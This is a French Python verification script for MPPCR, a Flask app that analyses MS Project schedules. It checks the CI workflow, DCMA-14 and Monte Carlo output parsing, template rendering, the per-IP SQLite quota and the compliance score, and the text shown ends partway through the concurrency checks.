#!/usr/bin/env python3
"""Vérifications locales de MPPCR (parsing, templates, quota, workflow).

À lancer depuis le répertoire de staging :
    USAGE_DB_PATH=/tmp/mppcr_check/usage.db python3 /chemin/check_mppcr.py
"""
import io
import os
import secrets
import threading
import time
import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

# Les deux scripts CLI ne sont plus protégés par une empreinte figée (la liste
# des empreintes n'était jamais lue, et elle était périmée depuis la v1.10.0) :
# ce qui compte est que leur SORTIE PAR DÉFAUT reste identique, ce que vérifient
# ref_dcma.txt et ref_mc.txt, comparés pour de vrai plus bas.

STAGE = Path(__file__).resolve().parent
CHECK_DIR = Path(os.environ.get("CHECK_DIR", "/tmp/mppcr_check"))
if CHECK_DIR.exists():
    shutil.rmtree(CHECK_DIR)
CHECK_DIR.mkdir(parents=True)
os.environ["USAGE_DB_PATH"] = str(CHECK_DIR / "usage.db")
# Le script relit CHECK_DIR plus loin : sans cette valeur, l'exécution
# s'interrompait sur un KeyError au milieu du rapport.
os.environ["CHECK_DIR"] = str(CHECK_DIR)
os.environ["DAILY_ANALYSIS_LIMIT"] = "2"
os.environ["MAX_CONCURRENT_ANALYSES"] = "1"
sys.path.insert(0, str(STAGE))

FAILS = []
CHECKS = [0]


def check(label, condition, detail=""):
    CHECKS[0] += 1
    if condition:
        print(f"  OK   {label}")
    else:
        print(f"  FAIL {label} {detail}")
        FAILS.append(label)


def section(title):
    print(f"\n=== {title} ===")


# --------------------------------------------------------------------------
section("YAML : workflow GitHub Actions et docker-compose")

import yaml  # noqa: E402

wf_path = STAGE / ".github/workflows/docker-publish.yml"
wf = yaml.safe_load(wf_path.read_text(encoding="utf-8"))
check("workflow.yml se charge", isinstance(wf, dict))
check("permissions workflow-level", wf.get("permissions") == {"contents": "read", "packages": "write"},
      f"={wf.get('permissions')}")
triggers = wf.get(True) or wf.get("on")
check("déclencheurs push main + tags v*",
      triggers.get("push", {}).get("branches") == ["main"] and triggers["push"]["tags"] == ["v*"],
      f"={triggers}")
jobs = wf.get("jobs", {})


def job_step(job, name):
    return next(st for st in jobs[job]["steps"] if st.get("name") == name)
for job in ("test", "publish", "merge", "release"):
    check(f"job '{job}' présent", job in jobs)
check("publish dépend de test", jobs["publish"].get("needs") == "test")
check("merge dépend de publish", jobs["merge"].get("needs") == "publish")
check("release dépend de merge et filtré sur tag v*",
      jobs["release"].get("needs") == "merge" and "refs/tags/v" in jobs["release"].get("if", ""))
test_runners = [m["runner"] for m in jobs["test"]["strategy"]["matrix"]["include"]]
check("matrice test = runners natifs amd64 + arm64",
      sorted(test_runners) == ["ubuntu-24.04", "ubuntu-24.04-arm"], f"={test_runners}")
pub_runners = [m["runner"] for m in jobs["publish"]["strategy"]["matrix"]["include"]]
check("matrice publish = runners natifs amd64 + arm64",
      sorted(pub_runners) == ["ubuntu-24.04", "ubuntu-24.04-arm"], f"={pub_runners}")
meta_tags = job_step("merge", "Extract metadata")["with"]["tags"]
check("tag latest sur branche par défaut", "latest" in meta_tags and "is_default_branch" in meta_tags)
check("tags semver vX.Y.Z / vX.Y / vX",
      all(p in meta_tags for p in ("v{{version}}", "v{{major}}.{{minor}}", "v{{major}}")))
check("tag sha court", "type=sha,format=short" in meta_tags)
smoke = job_step("test", "Smoke test")["run"]
check("smoke test /healthz", "/healthz" in smoke)
check("smoke test /app/data/usage.db", "/app/data/usage.db" in smoke)
check("smoke test HEALTHCHECK", "State.Health.Status" in smoke)
check("smoke test : score, exports, attente et arrêt couverts par la CI",
      'class="card score-hero"' in smoke and "export=csv" in smoke
      and "export=xlsx" in smoke and "annuler/" in smoke
      and 'id="waiting" hidden' in smoke and 'id="cancel-btn"' in smoke)
check("smoke test : contrôle Log4j écrit sans piège « set -e »",
      "if grep -q 'Log4j'" in smoke and "&& { echo \"trace Log4j" not in smoke)
check("workflow : planning de test généré pour la CI",
      "planning de test" in job_step("test", "Créer un planning de test")["run"])
check("cache gha dans publish",
      "type=gha" in job_step("publish", "Build and push by digest")["with"]["cache-from"])

compose = yaml.safe_load((STAGE / "docker-compose.prod.yml").read_text(encoding="utf-8"))
svc = compose["services"]["mppcr"]
check("compose pinne une version (pas :latest)", ":latest" not in svc["image"], f"={svc['image']}")
check("compose expose DAILY_ANALYSIS_LIMIT", any("DAILY_ANALYSIS_LIMIT" in e for e in svc["environment"]))
check("compose healthcheck urllib", "urllib.request" in " ".join(svc["healthcheck"]["test"]))
check("compose sans volume", "volumes" not in svc)

# --------------------------------------------------------------------------
section("Regex Log4j (section 1.1)")

import app  # noqa: E402

noise = "2026-09-15T08:49:36.442228766Z main ERROR Log4j API could not find a logging provider.\n"
body = "=" * 72 + "\nDIAGNOSTIC DCMA-14 — /tmp/x/planning.mpp\n" + "=" * 72 + "\n1. Logic xx  A CORRIGER\n"
filtered = app.LOG4J_NOISE.sub("", noise + body)
check("ligne Log4j supprimée", "Log4j" not in filtered)
check("sortie utile intacte", filtered == body, f"={filtered[:60]!r}")
check("sortie sans Log4j inchangée", app.LOG4J_NOISE.sub("", body) == body)

# --------------------------------------------------------------------------
section("Parsing DCMA-14 sur sortie réelle simulée")


def dcma_stdout(status_date=None):
    rows = [
        ("1. Logic (taches sans lien amont/aval)", "94.74%", "18/19", "A CORRIGER"),
        ("2. Leads (lag negatif)", "0.0%", "0/0", "OK"),
        ("3. Lags (lag positif)", "0.0%", "0/0", "OK"),
        ("4. Relations Finish-to-Start", "84.0%", "16/19", "A CORRIGER"),
        ("5. Contraintes dures", "0.0%", "0/19", "OK"),
        ("6. Marge totale excessive (>44j)", "10.5%", "2/19", "A CORRIGER"),
        ("7. Marge totale negative", "0.0%", "0/19", "OK"),
        ("8. Duree excessive (>44j)", "0.0%", "0/19", "OK"),
        ("9. Dates invalides (vs date d'etat)", "N/A", "-", "N/A (date d'etat manquante)"),
        ("10. Taches de detail sans ressource", "100.0%", "19/19", "INFO"),
        ("11. Taches terminees en retard vs baseline", "N/A", "-", "N/A (baseline manquante)"),
        ("12. Test chemin critique (CPTest)", "-", "-", "N/A (verification manuelle requise)"),
        ("13. Critical Path Length Index (CPLI)", "1.0", "34 taches critiques", "OK"),
        ("14. Baseline Execution Index (BEI)", "N/A", "-", "N/A (baseline/date d'etat manquante)"),
    ]
    width = max(len(r[0]) for r in rows) + 2
    out = ["=" * 72, "DIAGNOSTIC DCMA-14 — /tmp/mppweb_x/planning.mpp"]
    out.append("Date d'etat du projet : NON RENSEIGNEE (plusieurs controles seront N/A)"
               if status_date is None else f"Date d'etat du projet : {status_date}")
    out.append("=" * 72)
    out += [f"{n:<{width}} {v:>10}  {d:<15}  {verd}" for n, v, d, verd in rows]
    out += ["", "Resume : 3 controle(s) en ecart, 4 non applicable(s) faute de donnees, 7 OK.", ""]
    return "\n".join(out) + "\n"


parsed = app.parse_dcma_output(dcma_stdout())
check("14 lignes parsées", parsed["kpi"]["total"] == 14, f"={parsed['kpi']}")
check("comptage ok/ko/na/info",
      (parsed["kpi"]["ok"], parsed["kpi"]["ko"], parsed["kpi"]["na"], parsed["kpi"]["info"]) == (6, 3, 4, 1),
      f"={parsed['kpi']}")
check("statut global = 3 contrôle(s) à corriger", parsed["status_label"] == "3 contrôle(s) à corriger",
      f"={parsed['status_label']}")
check("date d'état captée", "NON RENSEIGNEE" in (parsed["status"] or ""), f"={parsed['status']}")
check("cibles DCMA présentes", parsed["rows"][0]["target"] == "≤ 5 %")
check("priorités construites", len(parsed["priorities"]) >= 3, f"={len(parsed['priorities'])}")
check("priorité n°1 = contrôle Logic", parsed["priorities"][0]["num"] == 1)
check("synthèse bloquante (Logic KO)", "bloquant" in parsed["overall_comment"], f"={parsed['overall_comment']}")
check("résumé capté", (parsed["summary"] or "").startswith("Resume"))

tc = app.app.test_client()
with app.app.test_request_context("/"):
    html_dcma = app.render_template("result.html", results=[{"kind": "dcma", "title": "Diagnostic qualité DCMA-14", "parsed": parsed}], filename="RL.mpp", labels=app.DCMA_LABELS, verdicts=app.VERDICT_LABELS)

check("DCMA : nom de fichier dans la puce (file-chip)",
      '<span class="file-chip">' in html_dcma and '<span class="ext">.mpp</span>' in html_dcma
      and "RL" in html_dcma)
check("DCMA : date d'état affichée en français quand elle est renseignée",
      app.date_etat_fr("Date d'etat du projet : 2026-10-05T08:00") == "05/10/2026 08:00"
      and app.date_etat_fr("Date d'etat du projet : NON RENSEIGNEE (controles N/A)")
      .startswith("NON RENSEIGNEE"))
check("DCMA : bandeau de score plafonné (date d'état et baseline manquantes)",
      "Plafonné à 60" in html_dcma and "avant plafond" in html_dcma)
n_kpi = len(re.findall(r'<div class="kpi[ "]', html_dcma))
check("DCMA : 5 cartes KPI", n_kpi == 5, f"={n_kpi}")
check("DCMA : héros de score (score, bande, barre, repères)",
      'class="card score-hero"' in html_dcma and 'class="score-num"' in html_dcma
      and 'class="band-badge' in html_dcma and 'class="score-fill' in html_dcma
      and html_dcma.count('class="tick"') == 3)
check("DCMA : formule du score étoffée par le barème dépliable",
      "Comment ce score est calculé" in html_dcma and 'id="methode-score"' in html_dcma)
check("DCMA : synthèse en bandeau rouge (Logic KO)",
      'class="alert alert-danger"' in html_dcma and "point bloquant" in html_dcma
      and 'class="alert-action"' in html_dcma)
check("DCMA : priorité numérotée 01", 'pr-ko">01<' in html_dcma or 'pr-na">01<' in html_dcma)
n_rows = html_dcma.count('<td class="ctrl-name">')
check("DCMA : 14 lignes de tableau", n_rows == 14,
      f"={n_rows}")
check("DCMA : tableau à 5 colonnes de la maquette",
      all(f"<th>{t}</th>" in html_dcma or t in html_dcma
          for t in ("Contrôle", "Résultat", "Cible", "Verdict", "Action recommandée"))
      and "Tâches concernées (N°)" not in html_dcma)
check("DCMA : lignes en écart surlignées (row-ko)", 'class="row-ko"' in html_dcma)
check("DCMA : sortie brute repliable",
      '<details class="opt"' in html_dcma and "<pre>" in html_dcma)
check("DCMA : pas de gabarit non rendu", "{{" not in html_dcma and "{%" not in html_dcma)
check("étapes : DCMA seul -> étape 2 active, Monte Carlo inerte",
      'class="step active"' in html_dcma and 'href="#diag"' in html_dcma
      and 'href="#mc"' not in html_dcma
      and html_dcma.count('class="step" title="Aucune') == 1)
check("étapes : lien de retour au formulaire", 'href="/"' in html_dcma)
check("étapes : la sortie prévient de la perte du résultat",
      'data-quit' in html_dcma and "Nouvelle analyse</a>" in html_dcma
      and "window.confirm" in html_dcma and "ev.preventDefault()" in html_dcma)
check("DCMA : 5 cartes KPI avec liseré (k-ok/k-ko/k-na/k-info)",
      all(f'class="kpi {k}"' in html_dcma for k in ("k-ok", "k-ko", "k-na", "k-info")))
n_dots = html_dcma.count('<span class="bdot"></span>')
check("DCMA : bandeau de score avec pastille",
      n_dots == 1 and 'class="badge b-ko"' in html_dcma, f"={n_dots}")
check("DCMA : priorités numérotées 01/02/03 avec rang coloré",
      all(f'{r}">0{i}<' in html_dcma for r, i in (("pr-ko", 1), ("pr-ko", 2), ("pr-ko", 3)))
      or 'pr-ko">01<' in html_dcma)
check("DCMA : action de chaque priorité sous forme de volet dépliable",
      f"{len(parsed['priorities'])} action" in html_dcma and "14 contrôles" in html_dcma
      and len(re.findall(r'<details class="prio"', html_dcma)) == len(parsed['priorities'])
      and 'class="prio-body"' in html_dcma and 'class="reco"' in html_dcma,
      f"={len(parsed['priorities'])} priorités")
check("DCMA : pas de colonne de tâches dans le tableau (maquette v2)",
      "Tâches concernées (N°)" not in html_dcma and "<th>Tâches" not in html_dcma)

empty = app.parse_dcma_output("=" * 72 + "\nDIAGNOSTIC DCMA-14 — /tmp/x/a.mpp\n" + "=" * 72 + "\n")
with app.app.test_request_context("/"):
    html_empty = app.render_template("result.html", results=[{"kind": "dcma", "title": "t", "parsed": empty}], filename="vide.mpp", labels=app.DCMA_LABELS, verdicts=app.VERDICT_LABELS)
check("DCMA vide : état vide géré", "Aucun contrôle exploité" in html_empty)

# --------------------------------------------------------------------------
section("Parsing Monte Carlo sur sortie réelle simulée")

MC_BODY = "\n".join([
    "=" * 72,
    "SIMULATION MONTE CARLO — /tmp/mppweb_x/planning.mpp",
    "=" * 72,
    "Taches de detail : 187",
    "Liens de dependance : 214",
    "Simulations : 5000",
    "",
    "Duree deterministe (chemin critique, durees planifiees) : 187.0 j",
    "P50 (mediane simulee)  : 191.4 j  (+4.4 j vs planifie)",
    "P80                    : 204.2 j  (+17.2 j vs planifie)",
    "P90                    : 214.8 j  (+27.8 j vs planifie)",
    "",
    "Indice de criticite par tache (top 10 -- % de simulations sur le chemin critique) :",
    "  Qualification structure — essais statiques   94.7%",
    "  Integration systeme propulsion              81.2%",
    "  Revue de conception critique (CDR)          58.0%",
    "  Livraison sous-ensemble avionique           47.3%",
    "  Essais environnementaux                     22.4%",
    "",
]) + "\n"

mc = app.parse_montecarlo_output(MC_BODY)
check("4 métriques de durée", len(mc["metrics"]) == 4, f"={[m['key'] for m in mc['metrics']]}")
check("valeurs numériques correctes",
      [m["value_num"] for m in mc["metrics"]] == [187.0, 191.4, 204.2, 214.8],
      f"={[m['value_num'] for m in mc['metrics']]}")
check("5 tâches de criticité", len(mc["criticality"]) == 5)
check("niveaux de criticité", [c["css"] for c in mc["criticality"]] == ["high", "high", "medium", "medium", "low"],
      f"={[c['css'] for c in mc['criticality']]}")
check("contexte réseau", mc["network"] == {"tasks": 187, "links": 214, "ratio_pct": 114.4}, f"={mc['network']}")
check("le ratio seul ne conclut pas sur la logique", mc["network_warning"] == "",
      f"={mc['network_warning'][:60]}")

# L'avertissement de fiabilité doit venir du contrôle 1 réel, pas d'un ratio de
# liens par tâche (deux populations et deux unités différentes). On réutilise la
# sortie DCMA synthétique du harnais, dont le contrôle 1 est à 94,74 % (18/19).
mc_fort = app.parse_montecarlo_output(MC_BODY)
app.croiser_logique_montecarlo(mc_fort, app.parse_dcma_output(dcma_stdout()))
check("logique insuffisante : avertissement construit sur le contrôle 1",
      "94.7 %" in mc_fort.get("network_warning", "") and "18/19" in mc_fort.get("network_warning", ""),
      f"={mc_fort.get('network_warning', '')[:80]}")
check("logique insuffisante : titre dédié",
      "Logique insuffisante" in mc_fort.get("network_title", ""))

texte_conforme = dcma_stdout().replace("94.74%", "2.0%").replace("18/19", "2/100")
mc_faible = app.parse_montecarlo_output(MC_BODY)
app.croiser_logique_montecarlo(mc_faible, app.parse_dcma_output(texte_conforme))
check("logique conforme : aucun avertissement", mc_faible.get("network_warning", "") == "",
      f"={mc_faible.get('network_warning', '')[:60]}")

mc_seul = app.parse_montecarlo_output(MC_BODY)
app.croiser_logique_montecarlo(mc_seul, None)
check("Monte Carlo seul : renvoi vers le diagnostic, sans juger la logique",
      "DCMA-14" in mc_seul.get("network_note", "")
      and mc_seul.get("network_warning", "") == "")
check("lecture décisionnelle calculée (virgule décimale française)",
      "204,2 j" in mc["decision"] and "+27,8 j vs CPM" in mc["decision"], f"={mc['decision'][:80]}")
check("KPI P50/P80/P90 + incertitude", len(mc["kpi"]) == 4, f"={[k['label'] for k in mc['kpi']]}")

with app.app.test_request_context("/"):
    html_mc = app.render_template("result.html", results=[{"kind": "montecarlo", "title": "Simulation Monte Carlo", "parsed": mc}], filename="PROJET-X.mpp", labels=app.DCMA_LABELS, verdicts=app.VERDICT_LABELS)

check("MC : nom de fichier dans la puce (file-chip)",
      '<span class="file-chip">' in html_mc and '<span class="ext">.mpp</span>' in html_mc
      and "PROJET-X" in html_mc)
check("MC : 4 cartes de durée", len(re.findall(r'<div class="dur-card(?:\s[^"]*)?"', html_mc)) == 4,
      f"={len(re.findall(r'<div class=.dur-card', html_mc))}")
check("MC : carte P80 mise en avant (reco + valeur verte)",
      'class="dur-card reco"' in html_mc and 'class="d-val" style="color:var(--ok)"' in html_mc)
check("MC : carte CPM repliée (ref)", 'class="dur-card ref"' in html_mc
      and "référence, pas un engagement" in html_mc)
check("MC : écart vs CPM calculé (virgule décimale)", "+17,2 j vs CPM" in html_mc)
check("MC : valeurs en jours", "204,2 <small>j</small>" in html_mc)
check("MC : encart lecture décisionnelle", "Lecture décisionnelle" in html_mc)
check("MC : pas de fuite de la sortie brute dans les cartes",
      "vs planifie" not in html_mc.split('<details class="opt"')[0])
n_crit = html_mc.count('class="crit-fill')
check("MC : barres de criticité", n_crit == 5,
      f"={n_crit}")
check("MC : criticité élevée en rouge (classe hot), le reste en dégradé neutre",
      html_mc.count('class="crit-fill hot"') == 2 and html_mc.count('class="crit-fill"') == 3,
      f"hot={html_mc.count('class=.crit-fill hot')}")
check("MC : note 70 %", "70 %" in html_mc)
check("MC : bandeau de contexte en paires label/valeur",
      all(k in html_mc for k in ("<b>187</b> tâches de détail", "<b>214</b> liens de dépendance",
                                 "<b>5000</b> simulations")))
check("MC : échelle des percentiles (4 repères CPM/P50/P80/P90)",
      html_mc.count('class="marker') == 4 and 'm-p80' in html_mc and 'axis-fill' in html_mc)
check("MC : repères de l'échelle positionnés et libellés",
      'style="left:2.0%"' in html_mc and '>P90<' in html_mc and '>CPM<' in html_mc)
check("MC : encart décisionnel de la maquette", 'class="callout"' in html_mc
      and 'class="c-icon"' in html_mc)
check("MC : bandeau d'axe et incertitude", 'class="card axis-card"' in html_mc
      and 'class="mc-meta"' in html_mc and "Incertitude P50 → P90" in html_mc)
check("MC : note de criticité (70 %)", "au-delà de 70 % de criticité" in html_mc)
check("MC : pas de gabarit non rendu", "{{" not in html_mc and "{%" not in html_mc)
check("étapes : Monte Carlo seul -> étape 3 active, DCMA inerte",
      'href="#mc"' in html_mc and 'href="#diag"' not in html_mc
      and html_mc.count('class="step" title="Aucun diagnostic') == 1
      and html_mc.count('aria-current="true"') == 1)
check("MC : section ancrable", 'id="mc"' in html_mc)
check("MC : sous-navigation absente quand il n'y a qu'une analyse", 'class="subnav"' not in html_mc)

STOP_BODY = "\n".join([
    "=" * 72,
    "SIMULATION MONTE CARLO — /tmp/x/planning.mpp",
    "=" * 72,
    "Taches de detail : 5",
    "Liens de dependance : 0",
    "",
    "ARRET : aucun lien predecesseur/successeur exploitable dans ce fichier.",
    "Sans reseau de dependances, il n'y a pas de chemin critique a simuler --",
    "chaque tache serait independante, ce qui donnerait un resultat trompeur.",
    "Renseignez d'abord les liens entre taches (voir le controle #1 'Logic'",
    "du diagnostic dcma14.py), puis relancez cette simulation.",
    "",
]) + "\n"
mc_stop = app.parse_montecarlo_output(STOP_BODY)
check("arrêt détecté", bool(mc_stop["stop_message"]))
check("arrêt qualifié", mc_stop["stop_title"] == "Aucune dépendance exploitable", f"={mc_stop['stop_title']}")
check("action corrective proposée", "contrôle Logic DCMA" in mc_stop["stop_action"])
with app.app.test_request_context("/"):
    html_stop = app.render_template("result.html", results=[{"kind": "montecarlo", "title": "t", "parsed": mc_stop}], filename="SANS-LIENS.mpp", labels=app.DCMA_LABELS, verdicts=app.VERDICT_LABELS)
check("MC arrêté : badge d'arrêt", "Simulation arrêtée" in html_stop and "b-ko" in html_stop)
check("MC arrêté : callout d'action", "Aucune dépendance exploitable" in html_stop)
check("MC arrêté : sortie brute ouverte", '<details class="opt" open' in html_stop)

# --------------------------------------------------------------------------
section("Quota par IP (section 2)")

db = Path(os.environ["USAGE_DB_PATH"])
check("base d'usage créée au démarrage", db.exists(), f"={db}")

import sqlite3  # noqa: E402
with sqlite3.connect(db) as conn:
    cols = [r[1] for r in conn.execute("PRAGMA table_info(usage)")]
check("schéma usage(ip, date, count)", cols == ["ip", "date", "count"], f"={cols}")

client = app.app.test_client()
r = client.get("/")
check("GET / 200", r.status_code == 200)
check("GET / affiche le quota", "2 analyses restantes" in r.get_data(as_text=True)
      and "aujourd’hui pour votre adresse IP" in r.get_data(as_text=True))
check("GET / contient la marque", "MPPCR" in r.get_data(as_text=True))
_page = r.get_data(as_text=True)
check("GET / : fil d'étapes de la maquette", 'class="stepper"' in _page)
check("GET / : étape 1 active, étapes 2 et 3 inertes",
      _page.count('class="step active"') == 1 and _page.count('aria-current="step"') == 1
      and _page.count('class="step" title="Lancez une analyse') == 2)
check("GET / : version affichée dans l'en-tête", 'class="version-tag"' in _page)

r = client.post("/analyse", data={})
check("POST sans fichier -> 400", r.status_code == 400)
with sqlite3.connect(db) as conn:
    used = conn.execute("SELECT COALESCE(SUM(count), 0) FROM usage").fetchone()[0]
check("quota non consommé sur requête invalide", used == 0, f"={used}")

# Depuis le lot 1, un script en échec ne décompte plus d'analyse.
for i in (1, 2, 3):
    r = client.post("/analyse", data={"analysis": "dcma", "format": "page",
                                      "mpp_file": (io.BytesIO(b"pas un mpp"), "planning.mpp")},
                    content_type="multipart/form-data")
    check(f"POST analyse #{i} : script en échec -> 400", r.status_code == 400, f"={r.status_code}")
with sqlite3.connect(db) as conn:
    used = conn.execute("SELECT COALESCE(SUM(count), 0) FROM usage").fetchone()[0]
check("trois échecs d'affilée -> aucun quota consommé", used == 0, f"={used}")

# Quota épuisé : on simule deux analyses déjà décomptées pour l'IP courante
with sqlite3.connect(db) as conn:
    conn.execute("INSERT INTO usage (ip, date, count) VALUES (?, ?, ?)",
                 ("127.0.0.1", app.today_key(), 2))
    conn.commit()
r = client.get("/")
check("GET / quota épuisé : aucune analyse restante",
      "Quota quotidien atteint" in r.get_data(as_text=True))
r = client.post("/analyse", data={"analysis": "dcma", "format": "page",
                                  "mpp_file": (io.BytesIO(b"pas un mpp"), "planning.mpp")},
                content_type="multipart/form-data")
body = r.get_data(as_text=True)
check("quota épuisé -> 429", r.status_code == 429, f"={r.status_code}")
check("page quota : titre", "Quota quotidien atteint" in body)
check("page quota : message", "limite de 2 analyses par jour" in body)
check("page quota : bandeau ambre", 'class="alert alert-warn"' in body)
check("page quota : action de retour", "Analyser un planning" in body)

r = client.get("/", headers={"X-Forwarded-For": "203.0.113.7"})
check("ProxyFix : quota distinct par IP", "2 analyses restantes" in r.get_data(as_text=True))

with sqlite3.connect(db) as conn:
    conn.execute("INSERT INTO usage (ip, date, count) VALUES (?, ?, ?)",
                 ("198.51.100.77", app.today_key(), 1))
    conn.commit()
r = client.get("/", headers={"X-Forwarded-For": "198.51.100.77"})
check("quota : singulier quand il reste 1 analyse",
      "1 analyse restante" in r.get_data(as_text=True))

with sqlite3.connect(db) as conn:
    rows = conn.execute("SELECT ip, date, count FROM usage ORDER BY ip").fetchall()
check("compteur SQLite par (ip, date)", rows and rows[0][2] == 2, f"={rows}")
check("date du jour au format ISO",
      bool(re.fullmatch(r"\d{4}-\d{2}-\d{2}", rows[0][1])), f"={rows[0][1]}")

r = client.get("/healthz")
check("GET /healthz -> ok", r.status_code == 200 and r.get_data(as_text=True) == "ok")

# --------------------------------------------------------------------------
section("Dockerfile, requirements, gitignore")


def read(name):
    return (STAGE / name).read_text(encoding="utf-8")


dockerfile = read("Dockerfile")
check("HEALTHCHECK présent avec les bons paramètres",
      "HEALTHCHECK --interval=30s --timeout=5s --start-period=15s --retries=3" in dockerfile)
check("HEALTHCHECK via urllib (pas curl)", "urllib.request.urlopen('http://localhost:5000/healthz')" in dockerfile)
check("/app/data créé et chowné",
      "mkdir -p /app/data" in dockerfile and "chown -R appuser:appuser /app" in dockerfile)
check("dcma14.py et montecarlo.py copiés tels quels", "COPY dcma14.py montecarlo.py app.py ./" in dockerfile)

req = read("requirements.txt")
# mpxj est volontairement épinglée à 16.6.0 : la 16.7.0 alloue sans borne dans
# TimephasedDataFactory sur certains .mpp (voir requirements.txt et le README).
installed = {"Flask": "3.1.3", "gunicorn": "26.2.0", "mpxj": "16.6.0", "JPype1": "1.7.1",
             "numpy": "2.4.6", "networkx": "3.6.1", "XlsxWriter": "3.2.9"}
pins = dict(l.split("==") for l in req.splitlines() if "==" in l and not l.startswith("#"))
check("requirements épinglés sur les versions installées", pins == installed, f"={pins}")
check("toutes les dépendances pinées",
      all("==" in l for l in req.splitlines() if l.strip() and not l.startswith("#")), f"={req}")

gi = read(".gitignore")
for pattern in ("*.mpp", "*.csv", "*.bak", "__pycache__/", "*.pyc", "*.log", ".env", ".env.*", ".DS_Store", "venv/", ".venv/"):
    check(f".gitignore contient {pattern}", pattern in gi)

readme = read("README.md")
for needle in ("MPPCR — MS Project Check & Risk", "client_max_body_size 25m", "ANALYSIS_TIMEOUT",
               "DAILY_ANALYSIS_LIMIT", "docker run -d -p 5000:5000", "docker-compose.prod.yml",
               "Sécurité — avertissement", "aucune authentification", "répertoire temporaire"):
    check(f"README contient « {needle} »", needle in readme)


# --------------------------------------------------------------------------
section("Score de conformité (barème v1)")

SPECS = {
    1: "Logic (taches sans lien amont/aval)", 2: "Leads (lag negatif)", 3: "Lags (lag positif)",
    4: "Relations Finish-to-Start", 5: "Contraintes dures", 6: "Marge totale excessive (>44j)",
    7: "Marge totale negative", 8: "Duree excessive (>44j)", 9: "Dates invalides (vs date d'etat)",
    10: "Taches de detail sans ressource", 11: "Taches terminees en retard vs baseline",
    12: "Test chemin critique (CPTest)", 13: "Critical Path Length Index (CPLI)",
    14: "Baseline Execution Index (BEI)",
}


def dcma_sortie(verdicts):
    """Sortie DCMA synthétique : verdict imposé par n°, les autres contrôles sont OK."""
    rows = []
    for num, name in SPECS.items():
        verdict = verdicts.get(num, "OK")
        value, detail = "0.0%", "0/10"
        if "N/A" in verdict:
            value, detail = "N/A", "-"
        elif verdict == "A CORRIGER":
            value = "42.0%"
        rows.append((f"{num}. {name}", value, detail, verdict))
    width = max(len(r[0]) for r in rows) + 2
    out = ["=" * 72, "DIAGNOSTIC DCMA-14 — /tmp/x/planning.mpp",
           "Date d'etat du projet : 2026-10-05T08:00", "=" * 72]
    out += [f"{n:<{width}} {v:>10}  {d:<15}  {vd}" for n, v, d, vd in rows]
    out += ["", "Resume : 0 controle(s) en ecart.", ""]
    return "\n".join(out) + "\n"


score_parfait = app.parse_dcma_output(dcma_sortie({}))["score"]
check("aucun écart -> 100/100", score_parfait["score"] == 100, f"={score_parfait}")
check("barème v1 annoncé", score_parfait["version"] == "v1")
check("contrôles 10 et 12 hors barème",
      score_parfait["universe"] == 12 and score_parfait["excluded"] == [10, 12],
      f"univers={score_parfait['universe']}")
check("tous les contrôles notés pèsent pareil (12 évalués)",
      score_parfait["evaluated"] == 12 and score_parfait["conformes"] == 12,
      f"={score_parfait['evaluated']}")

score_3ko = app.parse_dcma_output(dcma_sortie({1: "A CORRIGER", 2: "A CORRIGER", 7: "A CORRIGER"}))["score"]
check("3 écarts sur 12 -> 75/100", score_3ko["score"] == 75, f"={score_3ko['score']}")
check("pas de plafond quand les données sont là", not score_3ko["capped"])

manque_date = app.parse_dcma_output(
    dcma_sortie({9: "N/A (date d'etat manquante)", 14: "N/A (baseline/date d'etat manquante)"}))["score"]
check("date d'état manquante -> plafond 75", manque_date["score"] == 75 and manque_date["capped"],
      f"={manque_date['score']}")
check("base avant plafond conservée", manque_date["base"] == 100, f"={manque_date['base']}")
check("motif du plafond explicité", manque_date["missing"] == ["date d’état du projet"],
      f"={manque_date['missing']}")
check("N/A exclus du calcul : 9 et 14 sortent, 10 évalués",
      manque_date["evaluated"] == 10 and manque_date["na"] == 2, f"={manque_date['evaluated']}")

manque_deux = app.parse_dcma_output(
    dcma_sortie({9: "N/A (date d'etat manquante)", 11: "N/A (baseline manquante)",
                 14: "N/A (baseline/date d'etat manquante)"}))["score"]
check("date d'état + baseline manquantes -> plafond 60",
      manque_deux["score"] == 60 and len(manque_deux["missing"]) == 2, f"={manque_deux}")

vide = app.parse_dcma_output("=" * 72 + "\nDIAGNOSTIC DCMA-14 — /tmp/x/a.mpp\n" + "=" * 72 + "\n")["score"]
check("aucun contrôle -> score non évaluable", vide["score"] is None and vide["label"] == "Non évaluable")

info_et_na = app.parse_dcma_output(dcma_sortie({10: "INFO", 12: "N/A (verification manuelle requise)"}))["score"]
check("contrôles 10 (INFO) et 12 (N/A) hors barème : ni évalués ni fautifs",
      info_et_na["evaluated"] == 12 and info_et_na["conformes"] == 12
      and info_et_na["universe"] == 12 and info_et_na["na"] == 0 and info_et_na["score"] == 100,
      f"={info_et_na}")

with app.app.test_request_context("/"):
    html_score = app.render_template(
        "result.html", filename="RL.mpp",
        results=[{"kind": "dcma", "title": "t", "parsed": app.parse_dcma_output(dcma_sortie({1: "A CORRIGER"}))}],
        labels=app.DCMA_LABELS, verdicts=app.VERDICT_LABELS)
check("résultat : score affiché avec le barème", 'class="card score-hero"' in html_score
      and "Score de conformité DCMA" in html_score and "Comment ce score est calculé" in html_score
      and 'class="score-num"' in html_score)
check("résultat : bande de couleur du score", 'class="score-fill bd-' in html_score)
with app.app.test_request_context("/"):
    html_plafond = app.render_template(
        "result.html", filename="x.mpp",
        results=[{"kind": "dcma", "title": "t",
                  "parsed": app.parse_dcma_output(dcma_sortie({9: "N/A (date d'etat manquante)"}))}],
        labels=app.DCMA_LABELS, verdicts=app.VERDICT_LABELS)
check("résultat : plafond expliqué quand il s'applique",
      "Plafonné à 75" in html_plafond and "avant plafond" in html_plafond
      and 'class="score-fill bd-' in html_plafond)

# --------------------------------------------------------------------------
section("Concurrence et quota (lot 1)")

slot1 = app.acquire_analysis_slot("198.51.100.1")
check("créneau réservé", isinstance(slot1, int) and slot1 > 0, f"={slot1}")
check("créneau refusé quand la limite est atteinte",
      app.acquire_analysis_slot("198.51.100.2") is None)
app.release_analysis_slot(slot1)
slot3 = app.acquire_analysis_slot("198.51.100.3")
check("créneau libéré puis réutilisable", slot3 is not None)
app.release_analysis_slot(slot3)

with sqlite3.connect(db) as conn:
    conn.execute("INSERT INTO running (ip, started_at) VALUES (?, ?)",
                 ("198.51.100.9", "2020-01-01T00:00:00+00:00"))
    conn.commit()
slot_orphan = app.acquire_analysis_slot("198.51.100.10")
check("créneau orphelin purgé automatiquement", slot_orphan is not None)
with sqlite3.connect(db) as conn:
    left = conn.execute("SELECT COUNT(*) FROM running").fetchone()[0]
